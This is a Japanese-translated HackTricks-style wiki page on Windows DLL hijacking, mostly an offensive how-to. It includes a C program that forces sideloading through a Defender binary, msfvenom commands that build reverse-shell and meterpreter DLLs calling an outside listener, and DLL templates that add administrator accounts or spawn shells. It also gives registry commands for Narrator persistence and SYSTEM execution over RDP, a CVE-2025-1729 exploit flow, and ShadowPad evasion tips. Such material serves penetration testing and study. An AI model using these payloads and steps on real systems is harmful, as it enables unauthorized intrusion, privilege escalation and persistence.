# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## 基本情報

DLL Hijacking は、信頼されたアプリケーションを操作して悪意のある DLL を読み込ませることを指します。この用語は **DLL Spoofing, Injection, and Side-Loading** のような複数の手法を包含します。主にコード実行や永続化、そして稀に権限昇格に利用されます。ここでは昇格に焦点を当てていますが、ハイジャック手法自体は目的にかかわらず基本的に同じです。

### 一般的な手法

DLL hijacking にはいくつかの方法があり、アプリケーションの DLL ロード戦略によってそれぞれ有効性が異なります:

1. **DLL Replacement**: 正規の DLL を悪意あるものと差し替え、必要に応じて DLL Proxying を使って元の DLL の機能を保持する方法。
2. **DLL Search Order Hijacking**: 悪意ある DLL を正規のものより先に検索されるパスに置き、アプリケーションの検索パターンを悪用する方法。
3. **Phantom DLL Hijacking**: アプリケーションが存在しない必要な DLL だと誤認して読み込むように、悪意ある DLL を作成する方法。
4. **DLL Redirection**: アプリケーションを悪意ある DLL に向けるために、%PATH% や .exe.manifest / .exe.local ファイルなどの検索パラメータを変更する方法。
5. **WinSxS DLL Replacement**: WinSxS ディレクトリ内の正規 DLL を悪意ある DLL に置換する方法で、しばしば DLL side-loading と関連する手法。
6. **Relative Path DLL Hijacking**: コピーしたアプリケーションと同じユーザー制御ディレクトリに悪意ある DLL を配置する方法で、Binary Proxy Execution 手法に似ています。

> [!TIP]
> DLL sideloading の上に HTML staging、AES-CTR configs、.NET implants を重ねるステップバイステップのチェーンについては、以下のワークフローを参照してください。

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## 欠落している DLL の検出

システム内の欠落している DLL を見つける最も一般的な方法は、sysinternals の [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) を実行し、**次の 2 つのフィルタ**を設定することです:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

そして **File System Activity** のみを表示します:

![](<../../../images/image (153).png>)

一般的な欠落 DLL を探している場合は、これを数秒間実行したままにします。\
特定の実行可能ファイル内の欠落 DLL を探している場合は、**"Process Name" "contains" `<exec name>`** のような別のフィルタを設定して実行し、イベントのキャプチャを停止してください。

## 欠落した DLL の悪用

権限昇格を行うために、最も有望なのは、特権プロセスが読み込もうとする DLL を、検索される場所のいずれかに書き込めることです。したがって、（稀なケースとして）元の **dll** が置かれているフォルダより先に検索されるフォルダに **dll** を書き込むか、あるいは元の **dll** がどのフォルダにも存在しないような、検索対象となるフォルダに **dll** を書き込めるようにします。

### DLL 検索順序

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Windows アプリケーションは、あらかじめ定義された検索パスのセットに従って DLL を検索します。悪意ある DLL をこれらのディレクトリのいずれかに戦略的に配置することで、本来の DLL より先に読み込まれてしまうことが DLL hijacking の問題となります。これを防ぐには、アプリケーションが必要とする DLL を参照する際に絶対パスを使用するようにするのが有効です。

以下は 32-bit システムでの **DLL search order** です:

1. アプリケーションが読み込まれたディレクトリ。
2. システムディレクトリ。パスを取得するには [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) 関数を使用します。(_C:\Windows\System32_)
3. 16-bit システムディレクトリ。パスを取得する関数はありませんが、検索されます。 (_C:\Windows\System_)
4. Windows ディレクトリ。パスを取得するには [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) 関数を使用します。
1. (_C:\Windows_)
5. 現在のディレクトリ。
6. PATH 環境変数にリストされているディレクトリ。これはアプリケーションごとに指定されるパスを含む **App Paths** レジストリキーを含まないことに注意してください。**App Paths** キーは DLL 検索パスの計算時には使用されません。

これは **SafeDllSearchMode** が有効な場合の **デフォルト** の検索順です。無効にすると現在のディレクトリが 2 番目に上がります。この機能を無効にするには、**HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** のレジストリ値を作成して 0 に設定します（デフォルトは有効）。

もし [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 関数が **LOAD_WITH_ALTERED_SEARCH_PATH** とともに呼ばれると、検索は **LoadLibraryEx** がロードしている実行モジュールのディレクトリから始まります。

最後に、**DLL が名前のみではなく絶対パスで指定されて読み込まれることがある**点に注意してください。その場合、その DLL はそのパスのみで検索されます（その DLL に依存関係がある場合、依存 DLL は名前で読み込まれた場合と同様に検索されます）。

検索順序を変更する他の方法もありますが、ここでは説明しません。

### RTL_USER_PROCESS_PARAMETERS.DllPath を使った sideloading の強制

新規作成したプロセスの DLL 検索パスに決定論的に影響を与える高度な方法として、ntdll のネイティブ API を使ってプロセスを作成する際に RTL_USER_PROCESS_PARAMETERS の DllPath フィールドを設定する方法があります。ここに攻撃者が制御するディレクトリを指定することで、インポートされた DLL を名前で解決する（絶対パスではなく、安全なロードフラグを使っていない）ターゲットプロセスに対し、そのディレクトリから悪意ある DLL を読み込ませることが可能になります。

Key idea
- RtlCreateProcessParametersEx でプロセスパラメータを構築し、ドロッパー/アンパッカーが存在するディレクトリなど、自分の制御するフォルダを指すカスタム DllPath を指定します。
- RtlCreateUserProcess でプロセスを作成します。ターゲットバイナリが DLL を名前で解決すると、ローダーは解決の際にこの提供された DllPath を参照し、悪意ある DLL がターゲット EXE と同じ場所に置かれていなくても信頼できる sideloading を可能にします。

Notes/limitations
- これは作成される子プロセスに影響し、現在のプロセスにのみ影響する SetDllDirectory とは異なります。
- ターゲットは DLL を名前でインポートするか、LoadLibrary で名前指定して読み込む必要があります（絶対パスではなく、LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories を使用していないこと）。
- KnownDLLs やハードコードされた絶対パスはハイジャックできません。フォワードされたエクスポートや SxS により優先順位が変わる場合があります。

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

運用上の使用例
- 悪意ある xmllite.dll（必要な関数をエクスポートするか、実際のものをプロキシするもの）をあなたの DllPath ディレクトリに配置します。
- 上記の手法で名前で xmllite.dll を参照することが知られている署名済みバイナリを起動します。ローダは指定された DllPath を介してインポートを解決し、あなたの DLL を sideload します。

この手法は実際の事例でマルチステージの sideloading チェーンを駆動するために使われていることが観測されています：初期のランチャーがヘルパー DLL をドロップし、それがカスタム DllPath を持つ Microsoft-signed で hijackable なバイナリを生成して、ステージングディレクトリから攻撃者の DLL をロードさせます。


#### Windows ドキュメントにおける dll 検索順の例外

Windows ドキュメントでは、標準の DLL 検索順に対するいくつかの例外が記載されています：

- **メモリ内ですでにロードされているものと同じ名前を共有する DLL が発見された場合**、システムは通常の検索をバイパスします。代わりに、デフォルトでメモリ内の DLL を使用する前に、リダイレクトと manifest の確認を行います。**この場合、システムは DLL の検索を実行しません。**
- DLL が現在の Windows バージョンの **known DLL** として認識される場合、システムはそのバージョンの known DLL とその依存 DLL を使用し、**検索プロセスを省略します**。レジストリキー **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** にはこれらの known DLL の一覧が格納されています。
- **DLL が依存関係を持つ場合**、これらの依存 DLL の検索は、最初の DLL がフルパスで識別されていたかどうかに関わらず、まるで依存 DLL が **module names** のみで示されているかのように行われます。

### 権限昇格

**要件**:

- **異なる権限**（横方向または側面移動）で動作している、または動作する予定のプロセスで、**DLL が存在しない**ものを特定します。
- **DLL** が**検索される**任意の **ディレクトリ** に対して **書き込みアクセス** が利用可能であることを確認します。場所は実行ファイルのディレクトリやシステムパス内のディレクトリである可能性があります。

ええと、要件は見つけるのが複雑です。なぜなら **デフォルトでは特権を持つ実行ファイルが DLL を欠いていることを見つけるのはかなり稀** であり、さらに **システムパスのフォルダに書き込み権限を持っていることはもっと稀**（通常は持てません）だからです。しかし、設定が誤っている環境ではこれは可能です。\
運良く要件を満たす状況であれば、[UACME](https://github.com/hfiref0x/UACME) プロジェクトを確認すると良いでしょう。プロジェクトの **主な目的は UAC をバイパスすること** ですが、使用している Windows バージョン向けの Dll hijaking の **PoC** が見つかるかもしれません（おそらく書き込み権限のあるフォルダのパスを変更するだけで済みます）。

なお、**フォルダの権限を確認する**には、次を実行します:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
そして **PATH 内のすべてのフォルダの権限を確認する**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
次のコマンドで executable の imports と dll の exports を確認できます:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
書き込み権限を持つ**System Path folder**で**Dll Hijackingを悪用して権限を昇格する**方法のフルガイドは次を参照してください:

{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### 自動化ツール

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)は system PATH 内の任意のフォルダに対して書き込み権限があるかをチェックします。\
この脆弱性を発見するのに有用な他の自動化ツールとしては **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ and _Write-HijackDll_ があります。

### 例

もし悪用可能なシナリオを見つけた場合、それを成功させるために最も重要な事項の一つは、**実行ファイルがそこからインポートするすべての関数を少なくともエクスポートするdllを作成すること**です。なお、Dll Hijackingは[escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac)または[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)への昇格に便利です。** **  
有効なdllを作成する方法の例は、実行のためのdll hijackingに焦点を当てたこの研究内で見つけることができます: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
さらに、次のセクションではテンプレートとして、あるいは不要な関数をエクスポートした**dllを作成する**ために役立つ**基本的な dll コード**をいくつか見ることができます。

## **Creating and compiling Dlls**

### **Dll Proxifying**

基本的に、**Dll proxy**は読み込まれたときに**悪意のあるコードを実行**できるDllであり、かつ**すべての呼び出しを実ライブラリに中継する**ことで期待どおりに**公開**および**動作**します。

ツール [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) や [**Spartacus**](https://github.com/Accenture/Spartacus) を使うと、実行ファイルを指定してプロキシ化したいライブラリを選択し**プロキシ化された dll を生成**したり、Dll を指定して**プロキシ化された dll を生成**したりできます。

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**meterpreter (x86) を取得する:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**ユーザーを作成する (x86、x64 バージョンは見当たりませんでした):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 自分で用意する

いくつかの場合、コンパイルしたDllは victim process によって読み込まれる複数の関数を **export several functions** する必要があります。これらの関数が存在しない場合、binary はそれらをロードできず、exploit は失敗します。

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>ユーザー作成を行う C++ DLL の例</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>スレッドエントリを持つ代替 C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## ケーススタディ: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows の Narrator.exe は起動時に予測可能な言語固有の localization DLL をプローブし、これをハイジャックすることで任意のコード実行と永続化が可能です。

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. No exports are required.

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Start Narrator and observe the attempted load of the above path.

最小限のDLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC を保つ
- A naive hijack will speak/highlight UI. To stay quiet, on attach enumerate Narrator threads, open the main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) and `SuspendThread` it; continue in your own thread. See PoC for full code.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- With the above, starting Narrator loads the planted DLL. On the secure desktop (logon screen), press CTRL+WIN+ENTER to start Narrator.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP to the host, at the logon screen press CTRL+WIN+ENTER to launch Narrator; your DLL executes as SYSTEM on the secure desktop.
- Execution stops when the RDP session closes—inject/migrate promptly.

Bring Your Own Accessibility (BYOA)
- You can clone a built-in Accessibility Tool (AT) registry entry (e.g., CursorIndicator), edit it to point to an arbitrary binary/DLL, import it, then set `configuration` to that AT name. This proxies arbitrary execution under the Accessibility framework.

Notes
- Writing under `%windir%\System32` and changing HKLM values requires admin rights.
- All payload logic can live in `DLL_PROCESS_ATTACH`; no exports are needed.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### 脆弱性の詳細

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### エクスプロイトの実装

An attacker can place a malicious `hostfxr.dll` stub in the same directory, exploiting the missing DLL to achieve code execution under the user's context:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### 攻撃フロー

1. 標準ユーザとして、`hostfxr.dll` を `C:\ProgramData\Lenovo\TPQM\Assistant\` に置く。
2. スケジュールされたタスクが現在のユーザコンテキストで午前9:30に実行されるのを待つ。
3. タスク実行時に管理者がログオンしていると、悪意のあるDLLが管理者セッションで medium integrity の権限で実行される。
4. 標準的な UAC バイパス手法を連鎖させ、medium integrity から SYSTEM 権限へ昇格する。

## 事例: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors はしばしば MSI ベースの dropper を DLL side-loading と組み合わせ、信頼された署名済みプロセスの下でペイロードを実行する。

Chain overview
- ユーザが MSI をダウンロードする。GUI インストール中に CustomAction がサイレントで実行され（例：LaunchApplication や VBScript アクション）、埋め込まれたリソースから次段を再構築する。
- dropper は正当な署名済み EXE と悪意ある DLL を同じディレクトリに書き込む（例: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll）。
- 署名済み EXE が起動されると、Windows の DLL 検索順により作業ディレクトリから最初に wsc.dll がロードされ、署名済み親プロセスの下で攻撃者コードが実行される（ATT&CK T1574.001）。

MSI analysis (what to look for)
- CustomAction テーブル：
- 実行ファイルや VBScript を実行するエントリを探す。疑わしいパターンの例：LaunchApplication がバックグラウンドで埋め込みファイルを実行する。
- Orca (Microsoft Orca.exe) で、CustomAction、InstallExecuteSequence、Binary テーブルを確認する。
- MSI CAB 内の埋め込み／分割ペイロード：
- 管理者抽出: msiexec /a package.msi /qb TARGETDIR=C:\out
- または lessmsi を使用: lessmsi x package.msi C:\out
- VBScript CustomAction によって連結・復号される複数の小さな断片を探す。よくある流れ：
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
wsc_proxy.exe を使った実践的な sideloading
- 次の2つのファイルを同じフォルダに配置してください:
- wsc_proxy.exe: 正規署名済みホスト (Avast)。プロセスはそのディレクトリから名前で wsc.dll をロードしようとします。
- wsc.dll: attacker DLL。特定のエクスポートが不要であれば DllMain で十分です；そうでない場合は proxy DLL を作成し、DllMain で payload を実行しながら必要なエクスポートを正規ライブラリへフォワードしてください。
- 最小限の DLL payload をビルドする:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- エクスポート要件がある場合、プロキシングフレームワーク（例: DLLirant/Spartacus）を使用して、ペイロードも実行するフォワーディングDLLを生成します。

- この手法はホストバイナリによるDLL名解決に依存します。ホストが絶対パスや安全な読み込みフラグ（例: LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories）を使用している場合、hijackは失敗する可能性があります。
- KnownDLLs、SxS、および forwarded exports は優先順位に影響し、ホストバイナリやエクスポートセットの選択時に考慮する必要があります。

## 署名された三点セット＋暗号化ペイロード（ShadowPad ケーススタディ）

Check Pointは、Ink DragonがShadowPadをディスク上でコアペイロードを暗号化したまま正当なソフトウェアに紛れ込ませるために、**three-file triad** を使用して展開する方法を説明しています:

1. **Signed host EXE** – AMD、Realtek、NVIDIA のようなベンダーが悪用される（`vncutil64.exe`、`ApplicationLogs.exe`、`msedge_proxyLog.exe`）。攻撃者は実行ファイルの名前を Windows バイナリに見えるように変更する（例: `conhost.exe`）が、Authenticode 署名は有効なままである。
2. **Malicious loader DLL** – EXEの隣に期待される名前でドロップされる（`vncutil64loc.dll`、`atiadlxy.dll`、`msedge_proxyLogLOC.dll`）。このDLLは通常、ScatterBrain フレームワークで難読化された MFC バイナリであり、その唯一の役割は暗号化されたブロブを検出して復号し、ShadowPad をリフレクティブにマップすることである。
3. **Encrypted payload blob** – 多くの場合、同じディレクトリに `<name>.tmp` として保存される。復号したペイロードをメモリマッピングした後、ローダはフォレンジック証拠を破壊するためにTMPファイルを削除する。

Tradecraft notes:

* 署名されたEXEの名前を変更しても（PEヘッダ内の元の `OriginalFileName` を保持したまま）Windowsバイナリのように見せかけつつベンダーの署名を保持できるため、実際には AMD/NVIDIA のユーティリティである `conhost.exe` 風のバイナリを配置する Ink Dragon の手口を再現すると良い。
* 実行ファイルが信頼されたままであるため、ほとんどの許可リスト制御は悪意あるDLLが並んで配置されているだけで足りる。loader DLL のカスタマイズに注力せよ；署名された親は通常そのまま実行できる。
* ShadowPad の復号器は TMP ブロブがローダの隣にあり、マッピング後にファイルをゼロ化できるよう書き込み可能であることを期待する。ペイロードがロードされるまでディレクトリを可書きにしておき、メモリ上に展開されたら TMP ファイルはOPSECの観点から安全に削除できる。

## References

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)


{{#include ../../../banners/hacktricks-training.md}}
